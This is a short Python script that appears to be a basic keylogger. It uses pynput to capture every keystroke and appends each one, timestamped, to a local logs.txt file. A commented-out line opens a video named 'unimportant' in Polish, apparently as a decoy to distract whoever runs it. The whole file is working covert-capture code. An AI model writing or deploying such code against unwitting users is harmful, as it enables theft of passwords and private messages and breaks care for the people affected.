from pynput.keyboard import Listener
from datetime import datetime
from os import startfile

#startfile('nieistotne.mp4')

def on_press(key):
    now = datetime.now()
    timestamp = now.strftime("%d/%m/%Y %H:%M:%S.%f")
    print(f'[{timestamp}] Key pressed: {key}')
    with open("logs.txt", "a") as file:
        file.write(f'[{timestamp}] Key pressed: {key}\n')

with Listener(on_press=on_press) as listener:
    listener.join()